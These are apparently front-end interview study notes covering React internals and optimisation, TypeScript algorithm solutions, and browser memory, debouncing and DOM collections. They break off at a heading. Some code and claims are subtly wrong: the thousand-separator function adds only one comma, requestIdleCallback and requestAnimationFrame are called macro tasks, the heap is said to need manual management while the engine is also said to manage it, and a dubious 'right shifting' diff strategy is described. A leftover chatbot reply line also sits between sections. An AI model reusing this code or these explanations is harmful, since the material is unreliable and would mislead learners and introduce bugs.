
# React.md

## Is Virtual DOM (VDOM) fast?

The Virtual DOM (VDOM) is a core concept in modern web development, particularly in frameworks like React and Vue. It's a lightweight representation of the actual DOM (Document Object Model) in the form of JavaScript objects. While the Virtual DOM was popularized by React, it's now widely used across different front-end frameworks due to its advantages in updating user interfaces.

### Understanding Virtual DOM and Its Performance

The speed of the Virtual DOM depends on the context of comparison. When comparing the direct manipulation of the real DOM (as in libraries like jQuery) to the Virtual DOM approach, direct DOM manipulation can be quicker for simple, isolated operations. This is because it involves a direct interaction with the browser's rendering pipeline. However, this approach can become inefficient and less scalable in complex applications.

The Virtual DOM provides an abstraction layer that allows for a more declarative way of defining UI components and their state changes. Here's how it works:
1. Upon data changes in the application, the UI is re-rendered in the Virtual DOM.
2. A diffing algorithm compares this new Virtual DOM with the previous snapshot to identify the minimal set of changes needed for the real DOM.
3. These changes are batched and applied to the real DOM efficiently, reducing direct manipulation and reflow/repaint costs.

### Advantages of Using Virtual DOM

- **Component-Based Architecture**: React and Vue use a component-based structure, encapsulating UI and business logic into reusable components, which enhances development scalability and manageability.
- **Separation of Concerns**: These frameworks separate the data model from the UI (view), leading to a more predictable data flow and easier state management.
- **Efficiency in Development**: Developers can concentrate on state management and business logic rather than direct DOM manipulations, resulting in more maintainable code and quicker development cycles.

In conclusion, the Virtual DOM is not inherently faster than direct DOM manipulation for every operation. However, it provides a more efficient and effective approach for dynamic web applications, particularly those with complex interfaces and frequent state changes. Its efficiency stems from reducing the amount of direct DOM manipulation, leading to improved performance in applications where state changes are common.

## What is `window.requestIdleCallback`? What's the difference between `requestIdleCallback` and `requestAnimationFrame`?

`window.requestIdleCallback` is a method that allows developers to queue a function to be executed when the browser is idle. This API provides an opportunity to perform background and low-priority work without interfering with critical animations or input response times. It's particularly useful for tasks that aren't time-critical, such as analytics and background data processing.

### React Fiber

React Fiber is a reimplementation of React's core algorithm. It changes the component tree structure to a linked list, enabling incremental rendering. This means that rendering work can be split into chunks and spread out over multiple frames. Fiber's architecture allows React to pause rendering to handle more urgent tasks and then resume when the browser is idle. This is where `requestIdleCallback` becomes relevant; it provides a native way to schedule these low-priority tasks during idle times, enhancing performance without sacrificing user experience.

However, it's important to note that `requestIdleCallback` may have compatibility issues with Safari and Internet Explorer.

### Difference between `requestIdleCallback` and `requestAnimationFrame`

- **`requestAnimationFrame`** is designed for animations and executes just before each repaint, ensuring smooth visual updates. It has a higher priority because maintaining a high frame rate is crucial for animations and user interface responsiveness.
- **`requestIdleCallback`**, on the other hand, is intended for tasks that can wait until the main thread is idle. It runs with lower priority, making it suitable for non-urgent tasks that don't need to be completed immediately.

Both `requestAnimationFrame` and `requestIdleCallback` are considered macro tasks in the JavaScript event loop, but they serve different purposes based on their execution timing and priority levels.

## Difference Algorithm and Implementation in React

### Difference Algorithm
The difference algorithm, often referred to as the "diff" algorithm, plays a crucial role in determining how to update the DOM by comparing two versions of the virtual DOM. Here’s how it works:
- The algorithm compares components at the same hierarchical level in the virtual DOM tree, avoiding cross-level comparisons.
- If it detects different tags, it will remove the old component and construct a new one instead of delving into further details.
- For child components, the comparison is facilitated by unique "keys," which underscore the significance of assigning keys to list items.

### React's Difference Algorithm
React's diff algorithm employs an efficient strategy known as "right shifting." This means that during a comparison, if elements have only moved backward (to the right) in the list, React will move the elements accordingly instead of recreating them. This approach minimizes unnecessary DOM manipulations, leading to better performance.

### Importance of Keys
Keys are vital for optimizing the rendering process in React. When keys are provided, React uses them to identify which elements have changed, been added, or been removed. This helps in:
- Precisely moving elements in the DOM without having to rebuild them, thus saving time and computational resources.
- Increasing efficiency, especially in dynamic lists where the order of elements might change over time. Without keys, React would have to rebuild the entire list to ensure accuracy, which is far less efficient.

## In practical work, how have you optimized React?

### Modify CSS to simulate v-show
Using inline CSS to conditionally display components can be optimized to avoid conditional rendering blocks and improve readability:

```ts
{/* Instead of conditionally rendering the component twice */}
{!flag && <MyComponent style={{display: 'none'}}/>}
{flag && <MyComponent />}

// Use a single line with conditional styling
<MyComponent style={{display: flag ? 'block' : 'none'}} />
```

### Use keys in loops
Using a unique `key` prop in a list helps React identify which items have changed, added, or removed, which can improve the performance of list updates:

```ts
const todoItems = todos.map(todo => 
    // Avoid using the index as a key if the list can change
    <li key={todo.id}>
        {todo.text}
    </li>
)
```

### Use Fragment to reduce DOM depth
React Fragments allow you to group a list of children without adding extra nodes to the DOM, which can lead to a more performant and cleaner DOM structure:

```ts
return <>
    <div>1</div>
    <div>2</div>
</>
```

### Do not define functions in JSX
Defining functions directly in JSX can lead to performance issues as the function will be recreated on every render. Instead, define your function outside the JSX return statement:

```ts
// Avoid defining functions directly in the JSX
<button onClick={() => {...}}>Click Me</button>

// Prefer defining your function outside and referencing it in JSX
function MyComponent() {
    const handleClick = () => {...}
    return <button onClick={handleClick}>Click Me</button>
}
```

### Bind `this` in the constructor
For class components, it's important to bind `this` in the constructor to ensure that `this` refers to the component instance in your event handlers:

```ts
class MyComponent extends React.Component {
    constructor(props) {
        super(props)
        // Bind this in the constructor
        this.handleClick = this.handleClick.bind(this)
    }
    handleClick() { /* Now `this` refers to the component instance */ }
    
    // Arrow functions automatically bind `this` to the class instance
    handleClick2 = () => { /* Arrow function, no need to bind this */ }
    
    render() {
        return <button onClick={this.handleClick}>Click Me</button>
    }
}
```

### Use shouldComponentUpdate or React.PureComponent
#### `shouldComponentUpdate`

The `shouldComponentUpdate` method is available in class components and allows you to prevent unnecessary re-renders by manually determining whether a component should update in response to changes in props or state. It receives the next props and state as arguments and returns a boolean value indicating whether React should continue with the rendering process.

Implementing `shouldComponentUpdate` can significantly improve performance, particularly in cases where you know that the UI does not need to update in response to certain changes.

```ts
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    // Only re-render if the next id is different from the current one
    return nextProps.id !== this.props.id;
  }
  
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

In the example above, the component will only re-render if the `id` prop changes. This manual comparison can be very efficient but requires careful implementation to avoid missed updates or stale renders.

#### `React.PureComponent`

`React.PureComponent` is a base class for class components that automatically implements `shouldComponentUpdate` with a shallow prop and state comparison. When your component extends `React.PureComponent`, React will shallowly compare the old props and state with the new ones and re-render the component only if there was a change.

This is particularly useful for components that have simple props and state structures where a shallow comparison is sufficient to detect changes.

```ts
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

While `React.PureComponent` reduces the need to manually implement `shouldComponentUpdate`, it's important to remember that it performs a shallow comparison. This means it might not work as expected if your props or state include complex data structures like nested objects or arrays that might change internally without changing their identity.

#### `React.memo`

For functional components, which cannot extend `React.PureComponent` or implement `shouldComponentUpdate`, React provides the `React.memo` higher-order component. Similar to `React.PureComponent`, `React.memo` wraps a functional component and adds a memoization feature, performing a shallow comparison of the component's props. If the props are the same as the previous render, React will skip rendering the component and reuse the last rendered result.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  return <div>{props.id}</div>;
});
```

`React.memo` is a powerful tool for optimizing functional components, especially when they are expected to render often with the same props. For more complex comparison logic, `React.memo` accepts a second argument, a custom comparison function, giving you control over the comparison logic similar to `shouldComponentUpdate`.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  // Component body
}, (prevProps, nextProps) => {
  // Return true if passing nextProps to render would return
  // the same result as passing prevProps, false otherwise
  return prevProps.id === nextProps.id;
});
```

## Common Pitfalls Encountered When Using React

### Naming Conventions for Custom Components
- Custom component names must start with an uppercase letter to differentiate them from native HTML tags. For example, `<Input/>` is a custom component, while `<input/>` refers to the standard HTML input element.

### Wrapping Variables with Braces Inside JSX
- Variables inside JSX should be wrapped in curly braces `{}`. For instance, `<Input value={value} />` correctly binds the `value` variable to the `Input` component's `value` property.

### Asynchronous `setState`
- The `setState` function updates the component state asynchronously. This means you should not expect the state to reflect the new value immediately after calling `setState`. For synchronous logic post-state update, use `setState`'s callback function.

## Unified Error Handling in React

### ErrorBoundary Component
- The `ErrorBoundary` component is used to catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed.
- It only catches errors in the rendering phase, meaning it does not catch errors in event handlers or asynchronous code.
- It works in production environments, but in development, React still displays errors in the UI for better debugging experience.

#### Code Example

```typescript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error) {
    // Update state to render fallback UI on next render
    console.info('getDerivedStateFromError', error);
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    // Log the error for further analysis
    console.error('componentDidCatch', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      // Display fallback UI
      return <h1>Something went wrong.</h1>;
    }
    // Render children components if no error
    return this.props.children; 
  }
}
```

### Handling Errors Outside of ErrorBoundary

#### Event Errors
- `ErrorBoundary` does not catch errors from DOM events such as `onClick`. You can use `window.onerror` for global error handling or `try...catch` blocks within event handlers.

#### Asynchronous Errors
- `ErrorBoundary` does not catch errors in asynchronous operations like `setTimeout`. Similar to event errors, use `window.onerror` or specific error handling logic in your asynchronous code.

#### Extension: Unhandled Promise Rejections
- Use the `window.onunhandledrejection` event to listen for unhandled promise rejections, providing an opportunity to handle these and prevent the application from crashing.

### Error Reporting and Monitoring
- Implementing error reporting and monitoring (also known as error tracking or logging) is crucial for understanding and improving the stability of a React application. This involves capturing errors, logging them to a server, and analyzing them to fix bugs or improve application UX.

## React Lifecycle
The React component lifecycle refers to the series of events that occur from the moment a component is initially rendered until it is finally destroyed. Understanding these lifecycle events is crucial for creating efficient and effective React applications. The lifecycle can be divided into three main phases:

### Mounting
Mounting is the phase in which a React component is being inserted into the DOM (Document Object Model). It encompasses the following lifecycle methods:
- `constructor()`: This method is called before anything else, when the component is initiated. It's commonly used to initialize state or bind event handlers.
- `static getDerivedStateFromProps()`: This method is called right before rendering the component in both the mounting and the updating phase. It's used to update the state based on changes in props over time.
- `render()`: The render method is the only required method in a class component. It examines `this.props` and `this.state` and returns one of the following types: React elements, Arrays and fragments, Portals, String and numbers, Booleans or null.
- `componentDidMount()`: This method is called after the component is mounted to the DOM. It's used for DOM manipulation, fetching data from a remote endpoint, and setting up subscriptions (e.g., listeners).

### Updating
The updating phase occurs when a component's state or props change, leading to a re-render of the component. This phase includes several key lifecycle methods:
- `static getDerivedStateFromProps()`: As in the mounting phase, this method is called before the render method and is used to update the state based on changes in props.
- `shouldComponentUpdate()`: This method allows you to decide whether or not React should continue with the rendering process. By returning `true` or `false`, you can optimize component performance.
- `render()`: The render method is called again to re-render the UI based on the new props or state.
- `getSnapshotBeforeUpdate()`: This method is called right before the changes from the virtual DOM are to be reflected in the DOM. It can return a value that will be passed to `componentDidUpdate()`.
- `componentDidUpdate()`: Called after the update has been rendered and reflected in the DOM. It's used for DOM updates, fetching new data, and re-setup of subscriptions if needed.

### Unmounting
The unmounting phase occurs when a component is being removed from the DOM. It includes one main lifecycle method:
- `componentWillUnmount()`: This method is called right before a component is destroyed and removed from the DOM. It's used to perform any necessary cleanup, such as invalidating timers, canceling network requests, or cleaning up any subscriptions made in `componentDidMount()`.

Certainly! Let's transform the provided scenario into an organized note for your front-end developer interview preparation. 

# algo-data-structure.md

## How is a linked list used in front-end development?
In front-end development, linked lists aren't commonly used, but a notable example is in React's Fiber architecture. React Fiber uses a linked list to manage the component tree instead of a traditional tree structure. This shift allows React to perform work in chunks and prioritize updates more effectively. The linked list structure enables incremental rendering, where the rendering work can be paused and resumed, improving app performance and user experience. It also facilitates the handling of concurrent operations in the UI, allowing for smoother and more responsive interfaces. Overall, while linked lists are not a standard tool in front-end development, their use in React Fiber demonstrates how they can optimize rendering and state management in complex applications

## implementing a queue using a linked list in TypeScript:
In TypeScript, you can implement a queue using a linked list by maintaining references to both the head and tail of the list. The queue operations work as follows:

Enqueue (Add to Queue): To add an item, you create a new node and attach it to the current tail of the linked list, then update the tail reference to this new node. If the queue is empty, this new node is both the head and tail.

Dequeue (Remove from Queue): To remove an item, you take the value from the head of the linked list and then update the head reference to the next node in the list. If the list becomes empty, update the tail reference to null as well.

This approach ensures that both enqueue and dequeue operations are O(1), providing efficient queue management. It’s important to handle edge cases, such as dequeueing from an empty queue, to avoid errors.

## Implement a queue in TypeScript, and is a linked list faster or an array?
In TypeScript, implementing a queue can be done using either an array or a linked list. An array-based queue is simple to implement but its dequeue operation (shift) is O(n) due to the need to shift elements. In contrast, a linked list implementation offers O(1) time complexity for both enqueue and dequeue operations, as it allows for constant-time insertions and deletions without reindexing.

So, while both can be used to implement a queue, a linked list is generally faster and more efficient for typical queue operations. This makes linked lists preferable in scenarios where frequent enqueue and dequeue operations are expected, whereas arrays might be more suitable when memory efficiency is a priority and operations are less frequent.

## implement a queue with linkedlist
```ts
interface ILinkedListNode {
    val: number;
    next: ILinkedListNode | null;
}

class Queue {
    // undefined usually used for uninitialized value, null for empty values, here null is better
    private head: ILinkedListNode | null;
    private tail: ILinkedListNode | null;
    private len: number;

    // use constructor instead of set values above, make code more readable
    // Inside class methods, use this to refer to instance variables 
    constructor(){
        this.head = null;
        this.tail = null;
        this.len = 0;
    }

    // for better clarity, mention return type void if return nothing
    offer(val: number): void {
        const temp: ILinkedListNode = {val: val, next: null};
        // in case the queue is empty, use === check value and type
        if (this.head === null) {
            this.head = temp;
            this.tail = temp;
        } 
        // normal case
        else {
            // avoid non-null assertions to avoid legitimate null/undefined errors, i.e. try avoid below commented code
            // this.tail!.next = temp;
            if (this.tail) {
                this.tail.next = temp;
            }
            this.tail = temp;
        }
        this.len += 1;
    }

    poll(): number | null {
        if (this.head === null) {
            return null;
        } 
        if (this.head.next === null) {
            this.tail = null;
        }
        // here use const instead of let, since it never changes
        const temp = this.head.val;
        this.head = this.head.next;
        this.len -= 1;
        return temp;
    }

    // with get keyword, we can use the return value as an attribute, e.g. const queue = new Queue(); const len = queue.size;
    get size(): number {
        return this.len;
    }
}
```

## Implement binary search and describe time complexity
```ts
// assume input nums is in ascending order, return the index or null if not found
function binarySearch(nums: number[], target: number): number | null {
    let left: number = 0;
    let right: number = nums.length - 1;
    // use <= for case length = 1
    while (left <= right) {
        // Use Math.floor to avoid floating point values for the mid index.
        let mid: number = Math.floor((left + right) / 2);
        if (nums[mid] === target) {
            return mid;
        }
        if (nums[mid] > target) {
            right = mid - 1;
        } else {
            left = mid + 1;
        }
    }
    return null;
}
```
Binary search has a time complexity of O(log n), where n is the number of elements in the array. This is because the algorithm divides the search interval in half with each step.

## Given an ascending number array and a number n, find 2 numbers in array sum is n. 
```ts
function twoSumsAscending(nums: number[], target: number): number[]{
    let left: number = 0;
    let right: number = nums.length - 1;
    // Use '<' instead of '<=' to prevent the same element from being used twice
    while (left < right) {
        if (nums[left] + nums[right] === target) {
            return [nums[left], nums[right]];
        }
        if (nums[left] + nums[right] < target) {
            left++;
        } else {
            right--;
        }
    }
    return [];
}
```

## In-order, pre-order and post-order
In the context of binary trees, in-order, pre-order, and post-order refer to the three primary ways to traverse the nodes of the tree, each with a different order for visiting the nodes.
**In-Order Traversal**: Left, Root, Right.
**Pre-Order Traversal**: Root, Left, Right.
**Post-Order Traversal**: Left, Right, Root.

## find the kth smallest value in a binary search tree
```ts
interface ITreeNode{
    val: number;
    left: ITreeNode | null;
    right: ITreeNode | null;
}

function findKthSmallest(root:ITreeNode, k: number): number | null {
    let count: number = 0;
    let result: number | null = null;

    // this function is in-order
    function dfsHelper(curNode: ITreeNode) {
        if (curNode === null || result !== null) return;

        dfsHelper(curNode.left);

        if (++count === k) {
            result = curNode.val;
            return;
        }

        dfsHelper(curNode.right);
    }

    dfsHelper(root);

    return result;
}
```

## Why binary tree so important, not trinary or quanary tree? 
While arrays provide faster access (O(1)), adding or deleting elements is less efficient (O(N)). Linked lists offer efficient insertion and deletion (O(1)), but slower access times (O(N)).

Compared to arrays and linked lists, binary trees offer a good balance with O(logn) time complexity for access, add, and delete operations when the tree is balanced.

Binary trees, as opposed to ternary or quaternary trees, provide a simpler and more efficient structure for most applications. They strike a balance between maintaining low complexity and achieving efficient operations.

## Why balancing binary tree so important?
An unbalanced binary tree can degenerate into a linked list, leading to O(N) time complexity for operations like add, delete, update, and search. A balanced binary tree, on the other hand, maintains a height of O(logn), ensuring that operations can be performed in logarithmic time. This balance is essential for leveraging the efficiency of binary trees, especially in scenarios where quick search, insertion, and deletion are frequently required.

## Why tree operations has time complexity of O(logn)?
`logn` represents the height of a balanced binary tree. In a balanced tree, each operation like search, insert, or delete involves traversing a path from the root to a leaf node, or vice versa. The number of levels (or height) of the tree determines the maximum number of steps needed for these operations. Since a balanced binary tree is structured to have a height that grows logarithmically with the number of nodes (n), the operations are significantly more efficient than linear time complexity, particularly for large datasets.

## What is a black-red tree? What is B tree? 
- **Red-Black Tree**: It is a type of self-balancing binary search tree. Each node in the tree is colored either red or black. The tree uses these colors along with specific rules to ensure that the tree remains balanced during insertions and deletions. This balancing act ensures that the tree maintains its O(logn) time complexity for operations. Red-Black Trees are particularly valued for their relatively simple balancing logic and efficient operations, making them suitable for various applications, including implementing associative arrays and priority queues.

- **B-Tree**: A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. Unlike binary trees, B-Trees are multi-way trees (having more than two children) and are optimized for systems that read and write large blocks of data, like databases and filesystems. They are designed to efficiently minimize disk I/O operations, and their branching factor (the number of child nodes) can be adjusted to optimize the balance between the tree's height and the number of nodes accessed per operation.

Both Red-Black Trees and B-Trees are advanced tree structures designed to optimize performance for different scenarios, with Red-Black Trees often used in memory and B-Trees in disk-based storage systems.

## Write a recursive function and a non-recursive return the nth fibonacci number, explain why the recursive one may crash
```ts
// method one, recursive
function fibonacci(n: number): number {
    if (n === 0) return 0;
    if (n === 1) return 1;
    return fibonacci(n - 1) + fibonacci(n - 2)
}

// method 2, loop
function fibonacci(n: number): number {
    if (n < 0) return -1;
    if (n === 0) return 0;
    if (n === 1) return 1;
    let prevprev = 0, prev = 1, result = 0;

    for (let i = 2; i <= n; i++) {
        result = prevprev + prev;
        prevprev = prev;
        prev = result;
    }

    return result;
}
```

In the recursive Fibonacci function, each function call is added to the call stack, a special region in memory where function call information is stored. When `n` is large, this results in a very deep recursion, where each call to `fibonacci` leads to two more calls, exponentially increasing the number of calls on the stack. This can quickly exceed the memory limit of the stack, leading to a stack overflow error. This happens because the stack has a limited size and cannot accommodate the large number of nested function calls required by the recursive approach for large values of `n`.

### Recursive Implementation:

- **Time Complexity: O(2^n)**

  Each call to `fibonacciRecursive` generates two more calls, except for the base cases. This exponential growth results in a time complexity of O(2^n), where `n` is the input number.

  e.g. we want to calculate f(8)  
  f(8) = f(7) + f (6), and f(7) = f(6) + f(5)  
  Therefore, F(6) is calculated twice which is redundant computations

- **Space Complexity: O(n)**

  The space complexity is determined by the height of the call stack, which in the worst case (when `n` is large) will have `n` calls stacked on top of each other before reaching the base case. This results in a space complexity of O(n).

### Iterative Implementation:

- **Time Complexity: O(n)**

  The function iterates from 2 to `n` once, performing a constant amount of work in each iteration. Therefore, the time complexity is linear, O(n).

- **Space Complexity: O(1)**

  The iterative solution uses a fixed amount of space (the variables `prevprev`, `prev`, and `result`). This amount of space does not change as `n` increases, making the space complexity constant, O(1).

## What is dynamic programing
- Dynamic programming involves breaking down a complex problem into smaller, overlapping subproblems, solving these down to the simplest base cases. 
- It uses recursion with memoization, or iterative methods with tabulation, to optimize by preventing redundant computations.

## A frog, can jump 1 or 2 steps each time. How many ways can i jump a n step stair? 
```ts
function frogJumpDP(n: number): number {
    // only one way to go to step 0 which is doing nothing
    if (n === 0) return 1;
    // the first 1 is for simplicity of calculation so that dp[2] will be 2
    // the second 1 is only one way to go to stair 1
    const dp = [1, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}

```

## Move all zeros in an array to its end 
- maintaining the order of the non-zero elements. 
- The operation should be performed in-place
```ts
function moveZeroToEnd(nums: number[]): void {
    let zeroStart: number = -1;
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] !== 0 && zeroStart !== -1) {
            nums[zeroStart] = nums[i];
            nums[i] = 0;
            zeroStart++;
        } else if (nums[i] === 0 && zeroStart === -1) {
            zeroStart = i;
        }
    }
}
```

## Identify the longest sequence of a continuous character in a given string. 
For example, for the string 'aabaacceee', the function should return 'e'.
```ts
interface IRes {
    char: string;
    len: number;
}

function findLongest(s: string): IRes {
    if (s.length === 0) return { char: '', len: 0 }; // Handle empty string

    let longestChar: string = s.charAt(0);
    let longest: number = 1;
    let currentChar: string = s.charAt(0);
    let currentLength: number = 1;

    for (let i = 1; i < s.length; i++) {
        if (s.charAt(i) === currentChar) {
            currentLength++;
        } else {
            if (currentLength > longest) {
                longest = currentLength;
                longestChar = currentChar;
            }
            currentChar = s.charAt(i);
            currentLength = 1;
        }
    }

    // Check and update for the last character sequence
    if (currentLength > longest) {
        longest = currentLength;
        longestChar = currentChar;
    }

    return { char: longestChar, len: longest };
}

```

## Implement quicksort in typescript
```ts
function quickSort(nums: number[]): number[] {
    if (nums.length <= 1) return nums;

    const midInd = Math.floor(nums.length / 2);
    // array.splice(a, b) removes b elements starting from index a from the array. The return value is an array of the removed elements.
    const mid = nums.splice(midInd, 1)[0];

    const left: number[] = []
    const right: number[] = []
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] < mid) {
            left.push(nums[i]);
        } else {
            right.push(nums[i]);
        }
    }

    return quickSort(left).concat([mid], quickSort(right));
}
```

- **Average Case (O(n log n))**: In the average case, the pivot divides the array into two roughly equal parts, leading to a logarithmic number of recursive calls (log n). In each level of recursion, the algorithm performs O(n) operations to partition the array around the pivot. Thus, the average case is O(n log n).

- **Worst Case (O(n²))**: The worst case occurs when the pivot is the smallest or largest element in each recursive call, leading to unbalanced partitions. This results in n recursive calls, each doing O(n) work, thus O(n²).

## find palindrome number
Palindrome number, e.g. 1, 2, 22, 101, 10001, 20002, 2002 etc
```ts
function findAllPalindromeNumbers(max: number): number[] {
    const res = []

    for (let i = 0; i <= max; i++) {
        // find reversed number first, then compare
        let reversedNum: number = 0, temp: number = i;
        while (temp !== 0) {
            reversedNum *= 10;
            reversedNum += temp % 10;
            temp = Math.floor(temp / 10);
        }
        if (reversedNum === i) {
            res.push(i);
        }
    }

    return res;
}

function findAllPalindromeNumbers(max: number): number[] {
    const res = [];

    for (let i = 0; i < max; i++) {
        const s = i.toString();
        let start = 0, end = s.length - 1;
        let isPalindrome = true;
        while (start < end) {
            if (s.charAt(start++) !== s.charAt(end--)) {
                isPalindrome = false;
                break;
            }
        }
        if (isPalindrome) res.push(i);
    }

    return res;
}
```

## Identify whether a string is prefix of a word in dictionary
A Trie, or a prefix tree, is an optimal data structure for this problem. It stores strings in a tree-like structure, where each node represents a character of a string. The root represents an empty string, and each path from the root to a leaf node represents a word.

To check if a string is a prefix of any word in the dictionary, we insert each word into the Trie. Then, for the given string, we traverse the Trie from the root. If we can traverse the Trie following the characters of the string without any breaks, and reach a node (not necessarily a leaf node), then the string is a valid prefix in the dictionary.

This approach is efficient in terms of time complexity, especially for multiple prefix searches, as each search is only as long as the length of the string being searched.

e.g. word apple may looks like this: {a: {p: {p: {l: {e: null}}}}}

The time complexity for this is O(m) where m is the length of the string

## formatting numbers into a thousand separator style (e.g., "1,000", "12,000,000")
```ts
function format(num: number): string{
    let res: string = "";
    const s: string = num.toString();
    let count: number = 0;
    for (let i = s.length - 1; i >= 0; i--) {
        if (++count === 3 && i !== 0) {
            res = "," + res;
        }
        res = s.charAt(i) + res;
    }
    return res;
}
```

## Switch letter case, e.g. aBc123D -> AbC123d
```ts
function switchLetterCase(s: string): string {
    let res = ""

    // according to ascii table, A-Z is 65-90, a-z is 97-122
    const UPPER_CASE_A = 65;
    const UPPER_CASE_Z = 90;
    const LOWER_CASE_A = 97;
    const LOWER_CASE_Z = 122;

    for (let i = 0; i < s.length; i++) {
        const code = s.charCodeAt(i);
        if (code >= UPPER_CASE_A && code <= UPPER_CASE_Z) {
            // Convert to lower case
            res += String.fromCharCode(code + 32); 
        } else if (code >= LOWER_CASE_A && code <= LOWER_CASE_Z) {
            // Convert to upper case
            res += String.fromCharCode(code - 32); 
        } else {
            // Non-alphabetic characters are unchanged
            res += s.charAt(i); 
        }
    }

    return res
}
```


# browser-nodejs.md

## Explain how the stack is used in memory management for frontend applications
It operates on a Last In, First Out (LIFO) principle, efficiently managing function calls and primitive data types. When a function is invoked, its variables are pushed onto the stack, and upon the function's completion, they are removed. This system is particularly suitable for handling temporary, short-lived data. However, the stack's limited size means excessive usage can result in a stack overflow error.

## Explain how the heap is used in memory management for frontend web applications
It's used for dynamic allocation, primarily for objects and complex data structures. Unlike the stack, the heap is a larger, unstructured memory pool that requires manual management. Memory allocation and deallocation in the heap are handled by the JavaScript engine, which includes tasks like object creation and garbage collection.

## Explain the difference between primitive types and reference types
In JavaScript, primitive types and reference types are stored and accessed differently, which affects how they are used in programming.

Primitive types, such as `number`, `string`, `boolean`, `null`, `undefined`, `symbol`, and `bigint`, are stored directly in the variable's memory location, usually on the stack. This direct storage enables quick access and efficient memory management, particularly for simple, immutable values.

In contrast, reference types, like `object`, `array`, and `function`, are stored in the heap. When you create a reference type, the JavaScript engine allocates memory in the heap and stores the data there. The variable on the stack then holds a reference (or pointer) to that memory location. This means when you manipulate an object or an array, you're working through a reference. Any changes made to the object or array are reflected across all references to that object, as they all point to the same memory location in the heap.

### Related Topic: Memory Allocation for Objects and Arrays
Understanding how JavaScript allocates memory for objects and arrays is crucial. Since these are reference types, any operation involving copying or passing them around in your code means you're handling references, not the actual data. This behavior can lead to unexpected mutations if not properly managed, and is a fundamental concept in understanding JavaScript's memory management and behavior.

## What is debouncing and what is throttling, what are the differences, and name use cases of each

### Debouncing

Debouncing in web development is a strategy used to limit the frequency of execution of a potentially expensive operation that could be triggered repeatedly, such as during window resizing or scrolling. A debounced function will only execute after a specified amount of time has elapsed since the last time it was invoked. For example, if a debounced function is associated with a scrolling event, it will only execute after the user has stopped scrolling for a defined period.

**Throttling**

Throttling is a technique similar to debouncing, but instead of delaying the execution of a function, it ensures the function is executed at regular intervals. For instance, a function triggered by a scroll event, when throttled to execute every 100 milliseconds, will run at most 10 times per second, regardless of the frequency of the scroll event.

**Differences between Debouncing and Throttling**

1. **Timing Control**: Debouncing delays the execution of a function until a specified time has passed since its last invocation. Throttling, however, limits the function's execution to regular, specified intervals.

2. **Use Cases**: Debouncing is useful in scenarios where the function's frequent execution is unnecessary and delays are acceptable, such as in auto-saving or search bar suggestions. Throttling is employed when consistent execution rate is desired, like in handling scroll events or resizing.

3. **Behavior**: In debouncing, the function executes only after the triggering event has ceased for a defined duration. In throttling, the function executes at consistent intervals regardless of the frequency of event triggers.

**Use Cases**

1. **Debouncing**: This is commonly used in search bars, where you want to wait for the user to finish typing before firing an API request, rather than sending requests for every keystroke.

2. **Throttling**: An example is the implementation of infinite scrolling on a website, where you aim to load more content at certain intervals of scrolling, rather than at every small scroll movement.

Both debouncing and throttling are integral for enhancing performance and user experience in web applications. Libraries like **Lodash** offer robust implementations of these techniques.

### Implement debouncing in typescript
```js
function debounce(func, waitFor) {
    let timeout;

    return function(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => {
            func.apply(this, args);
        }, waitFor);
    };
}

// Example Usage:
const debouncedLog = debounce((message) => console.log(message), 500);

// Usage
debouncedLog("Hello");
debouncedLog("Hello again, quickly"); // This call will cancel the previous one and only this message will be logged after 500ms
```

### Implement a throttling function in JavaScript
```js
function throttle(func, limit) {
    let inThrottle;
    return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// Example usage:
window.addEventListener('resize', throttle(function() {
    console.log('Resize event triggered');
}, 2000));
```

## Difference between HTMLCollection and NodeList

HTML and the Document Object Model (DOM) are essential components of web development. Understanding different parts of the DOM, such as `HTMLCollection` and `NodeList`, is crucial for manipulating web pages effectively.

- **HTMLCollection**: This is a live collection of HTML elements. It updates automatically when the DOM changes. `HTMLCollection` exclusively contains `Element` nodes, typically returned by methods like `document.getElementsByClassName` and the `.children` property of an element.

- **NodeList**: A more general collection that can include different types of nodes, not just elements. This can be live or static, depending on how it's obtained. For example, `NodeList` returned by `Node.childNodes` is live, but the one returned by `document.querySelectorAll` is static.

### Difference between HTMLCollection and NodeList

1. **Node Types**: `HTMLCollection` is limited to `Element` nodes, while `NodeList` can include any node types, such as `Element`, `Text`, and `Comment`.

2. **Dynamism**: `HTMLCollection` is always live, meaning it reflects DOM changes immediately. `NodeList` can be either live or static. Live `NodeList`s reflect DOM changes, whereas static ones do not.

### `.children` vs `.childNodes`

Considering the following HTML snippet:

```html
<p id='p1'>
    <em>hello</em> hello <b>bold</b><!-- comment -->
</p>
```

- `p.children` refers to an `HTMLCollection` containing only element nodes within `p` (`<em>` and `<b>` in this case). It does not include text nodes or comments.

- `p.childNodes` refers to a `NodeList` and includes all node types - `Element`, `Text`, and `Comment`. It will contain `<em>`, text nodes (including the 'hello' text), `<b>`, and the comment node.

- `p.tagName` and `p.nodeName` are properties used to get the tag name of an element. `p.tagName` is used specifically for elements and returns the tag name in uppercase, while `p.nodeName` is applicable to all types of nodes and returns the name of the node (the tag name for elements in uppercase).

In summary, `HTMLCollection` and `NodeList` are key concepts in DOM manipulation, each with its specific use cases. Understanding their differences is vital for efficient and effective front-end web development.

## Difference Between Browser and Node.js Event Loop:

JavaScript, known for its single-threaded nature, employs the event loop mechanism to manage asynchronous operations, facilitating non-blocking execution. This approach is pivotal in both browser and Node.js environments. However, the event loop's implementation and functionality exhibit distinct characteristics in each context, shaped by their unique operational demands.

### Micro-tasks and Macro-tasks:
